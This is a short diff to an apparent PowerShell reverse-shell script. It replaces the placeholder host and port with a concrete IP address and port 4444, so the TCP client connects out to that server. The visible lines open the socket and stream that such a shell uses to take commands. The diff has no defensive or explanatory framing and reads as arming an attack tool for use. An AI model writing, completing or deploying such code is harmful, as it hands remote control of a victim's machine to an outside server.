@@ -1,5 +1,5 @@
-$ip = "YOUR_VPS_IP"    # Replace with your VPS IP
-$port = YOUR_PORT      # Replace with your listening port (e.g., 4444)
+$ip = "31.57.46.127"    # Replace with your VPS IP
+$port = 4444      # Replace with your listening port (e.g., 4444)
 
 $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
 $stream = $client.GetStream()
